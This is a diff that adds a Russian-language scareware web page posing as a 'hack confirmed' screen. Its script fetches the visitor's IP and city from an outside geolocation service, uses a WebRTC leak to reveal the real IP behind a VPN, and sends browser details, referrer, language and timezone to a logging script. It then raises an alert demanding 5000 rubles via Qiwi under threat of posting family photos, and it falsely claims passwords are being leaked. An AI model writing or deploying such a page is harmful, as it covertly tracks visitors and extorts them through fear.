@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Взлом подтвержден - Твои данные утекли</title>
+    <style>body{background:black;color:lime;font-family:monospace;}</style>
+</head>
+<body>
+    <h1>💀 ХАК УСПЕШЕН 💀</h1>
+    <pre>
+    [+] IP: <span id="ip">-</span>
+    [+] Город: <span id="city">-</span>
+    [+] Браузер: <span id="ua">-</span>
+    [+] Экран: <span id="screen">-</span>
+    [+] WebRTC: <span id="webrtc">-</span>
+    
+    Твои пароли сливаю на даркнет через 60 сек...
+    </pre>
+    
+    <script>
+    // Собираем данные
+    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+        document.getElementById('ip').innerHTML = d.ip;
+        document.getElementById('city').innerHTML = d.city + ', ' + d.country_name;
+    });
+    
+    document.getElementById('ua').innerHTML = navigator.userAgent;
+    document.getElementById('screen').innerHTML = screen.width+'x'+screen.height;
+    
+    // WebRTC leak (реальный IP даже через VPN)
+    var pc = new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel(''); pc.createOffer().then(pc.setLocalDescription.bind(pc));
+    pc.onicecandidate = e=> { if(e.candidate) document.getElementById('webrtc').innerHTML = e.candidate.candidate; };
+    
+    // Отправляем на сервер
+    fetch('logger.php', {
+        method: 'POST',
+        body: JSON.stringify({
+            ip: navigator.userAgent.includes('Mobile') ? 'Mobile' : '???',
+            ua: navigator.userAgent,
+            referrer: document.referrer,
+            lang: navigator.language,
+            cookies: navigator.cookieEnabled,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        })
+    });
+    
+    setTimeout(()=>alert('Данные отправлены хакерам. Плати 5000р на Qiwi или фотки семьи в сеть!'), 2000);
+    </script>
+</body>
+</html>
